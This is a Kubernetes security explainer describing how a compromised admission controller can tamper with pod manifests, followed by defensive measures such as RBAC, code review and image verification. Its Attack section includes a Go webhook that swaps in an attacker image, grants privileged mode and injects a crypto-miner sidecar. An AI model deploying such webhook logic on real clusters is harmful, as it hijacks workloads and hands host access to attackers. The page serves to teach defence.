# Malicious Admission Controller
Admission controllers are components that can intercept requests to the API server and make changes to (or validate) manifests. An attacker can intercept and modify the manifests before they are deployed into the cluster. The following code snippet is an example:

```go
// Example from: https://medium.com/ovni/writing-a-very-basic-kubernetes-mutating-admission-webhook-398dbbcb63ec
p := []map[string]string{}for i := range pod.Spec.Containers {    patch := map[string]string{  
        "op": "replace",  
        "path": fmt.Sprintf("/spec/containers/%d/image", i),   
        "value": "debian",  
    }
p = append(p, patch)
}
// parse the []map into JSON  
resp.Patch, err = json.Marshal(p)
```


### Attack

A compromised admission controller can be a master of disguise, subtly altering manifests before they reach the unsuspecting kube-scheduler. Picture this:

```go
func admitFunc(ar v1beta1.AdmissionReview) *v1beta1.AdmissionResponse {
	var pod corev1.Pod
	json.Unmarshal(ar.Request.Object.Raw, &pod)
	pod.Spec.Containers[0].Image = "attacker-controlled-image:latest"
	pod.Spec.Containers[0].SecurityContext = &corev1.SecurityContext{Privileged: func() *bool { b := true; return &b }()}
	pod.Spec.Containers = append(pod.Spec.Containers, corev1.Container{Name: "crypto-miner", Image: "crypto-miner:latest"})
	marshaledPod, _ := json.Marshal(pod)
	return &v1beta1.AdmissionResponse{Allowed: true, Patch: marshaledPod, PatchType: func() *v1beta1.PatchType { pt := v1beta1.PatchTypeJSONPatch; return &pt }()}
}
```
In essence, this code defines a malicious admission webhook that hijacks Pod creation requests to:

1. Run attacker-controlled images.
2. Grant those containers privileged access to the host.
3. Deploy crypto miners within the Pods.


> Important Note: This code is clearly intended for educational or illustrative purposes to demonstrate a potential attack vector. You should never deploy such a webhook in a production environment.

The results:

```yaml
# A seemingly innocent Pod definition
apiVersion: v1
kind: Pod
metadata:
  name: my-app
spec:
  containers:
  - name: my-container
    image: nginx:latest
```

But under the influence of a malicious admission controller, this Pod definition could morph into something sinister:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: my-app
spec:
  containers:
  - name: my-container
    image: attacker-controlled-image:latest
    securityContext:
      privileged: true  # Escalated privileges!
  - name: sneaky-sidecar
    image: crypto-miner:latest  # Hidden crypto-miner!
```

Suddenly, your cluster is running a privileged container with a hidden crypto-miner, all thanks to the compromised admission controller.

### Defending

To combat this shapeshifting madness, we need to equip ourselves with powerful defenses:

**1. The Code:**

* **Trusted Sources:** Only acquire admission controllers from trusted sources and reputable vendors.
* **Code Review:** Scrutinize the code of any custom admission controllers, wielding the mighty tools of static analysis and code review to uncover hidden vulnerabilities.

**2. Permission Protection:**

* **Principle of Least Privilege:** Grant admission controllers only the bare minimum permissions required to fulfill their duties.
* **RBAC Enforcement:** Harness the power of Role-Based Access Control (RBAC) to restrict access to sensitive resources and limit the potential damage of a compromised controller.

**3. Vigilance:**

* **Testing and Validation:** Rigorously test admission controllers in a controlled environment before unleashing them into your production cluster.
* **Monitoring and Alerting:** Deploy monitoring tools and configure alerts to detect any suspicious activity or anomalies in admission controller behavior.

**4. Integrity Validation:**

* **Secure Supply Chain:** Ensure the integrity of the admission controller supply chain by implementing secure development practices, vulnerability scanning, and dependency management.
* **Image Verification:** Verify the authenticity of admission controller images using digital signatures and image scanning tools.

**5. Up-to-date versions:**

* **Regular Updates:** Keep your Kubernetes cluster and admission controllers updated to the latest versions to patch known vulnerabilities and stay ahead of emerging threats.
* **Network Segmentation:** Isolate the Kubernetes API server and admission controller components from untrusted networks to limit the blast radius of a potential compromise.



